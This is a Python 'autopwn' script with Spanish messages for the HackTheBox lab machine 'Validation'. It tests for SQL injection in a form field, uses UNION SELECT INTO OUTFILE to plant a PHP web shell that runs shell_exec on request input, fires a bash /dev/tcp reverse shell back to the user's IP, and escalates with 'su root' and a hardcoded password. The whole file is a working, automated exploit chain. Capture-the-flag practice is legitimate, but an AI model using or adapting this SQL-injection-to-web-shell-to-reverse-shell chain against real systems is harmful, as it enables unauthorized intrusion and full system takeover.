from colorama import init,Fore,Style
import requests
import time
import os
import sys
import signal

def def_handler(sig, frame):
    print(f'{Fore.RED}\n[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'\n{Fore.BLUE}JAGGEDMULE14 - VALIDATION HACKTHEBOX AUTOPWN')
ip = input(f'\n{Fore.CYAN}Introduce tu IP (tun0): ')
port = int(input(f'\n{Fore.RED}[!]IMPORTANTE\n\n{Fore.GREEN}Si el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\nIntroduce tu puerto: '))

def ping(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False
from pwn import *
if ping('10.10.11.116') == True:
    time.sleep(0.5)
    print(f'{Fore.CYAN}\n[+]Conexión con la máquina exitosa')
    r = requests.get('http://10.10.11.116')
    if r.status_code == 200:
        time.sleep(0.5)
        print(f'{Fore.CYAN}[+]HTTP/{r.status_code} OK')
        time.sleep(0.5)
        print('[+]Probando SQL injection espera...')
        sql = {"username" : "test", "country" : "Brazil'"}
        url = 'http://10.10.11.116'
        p = requests.post(url, data=sql)
        if 'Uncaught Error' in p.text:
            time.sleep(0.5)
            print('[+]SQLI exitosa :D')
            time.sleep(0.5)
            print('[+]Creando concha reversa ;) espera...')
            cmd = {'username' : 'test', 'country' : """'UNION SELECT "<?php echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; ?>" INTO OUTFILE "/var/www/html/pito.php" -- #"""}
            p1 = requests.post(url, data=cmd)
            r1 = requests.get('http://10.10.11.116/pito.php')
            if r1.status_code == 200:
                print('[+]Concha reversa lista')
                def shell():
                    os.system(f"""curl 'http://10.10.11.116/pito.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261"'""")
                
                try:
                    threading.Thread(target=shell).start()
                except Exception as e:
                    print(f'[-]{e}')
                shellc = listen(port, timeout=5).wait_for_connection()
                
                if shellc.sock is None:
                    print(f'{Fore.RED}[-]Conexión fallida')
                    sys.exit(1)
                else:
                    shellc.sendline('export TERM=xterm')
                    shellc.sendline('su root')
                    shellc.sendline('uhc-9qual-global-pw')
                    print(f'{Fore.RED}\n\n[!!]PRESIONA ENTER Y DISFRUTA LA SHELL COMO ROOT / CTRL+C PARA SALIR\n\n')
                    shellc.interactive()

            else:
                time.sleep(0.1)
                print(f'{Fore.RED}[-]Algo salió mal')
                time.sleep(0.1)
                print('[-]No podrá efectuarse la concha reversa')

        else:
            time.sleep(0.5)
            print(f'{Fore.RED}[-]Algo salió mal')
            time.sleep(0.5)
            print('[-]SQLI no exitosa')
            sys.exit(1)

    else:
        print(f'{Fore.RED}[-]Algo salió mal')
        time.sleep(0.5)
        print(f'{Fore.RED}[-]HTTP/{r.status_code}')
        sys.exit(1)

else:
    print(f'{Fore.RED}\n[-]Nos fuimos a la verga')
    time.sleep(0.5)
    print(f'{Fore.RED}[-]Conexión con la máquina fallida')
    time.sleep(0.5)
    print(f'{Fore.RED}[-]La máquina está activa?')
    time.sleep(0.5)
    print(f'{Fore.RED}[-]Intenta correr el script de nuevo\n')
    sys.exit(1)
